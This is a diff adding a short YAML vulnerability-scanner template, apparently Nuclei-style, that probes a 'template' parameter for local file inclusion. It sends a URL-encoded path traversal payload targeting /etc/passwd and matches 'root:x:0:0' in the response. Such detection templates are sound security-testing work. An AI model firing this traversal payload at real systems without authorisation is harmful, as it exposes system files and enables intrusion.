@@ -1,0 +1,20 @@
+id: lfi6-1355
+name: 'Traversal in template'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via template'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      template:
+        - '%2e%2e%2fetc%2fpasswd'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
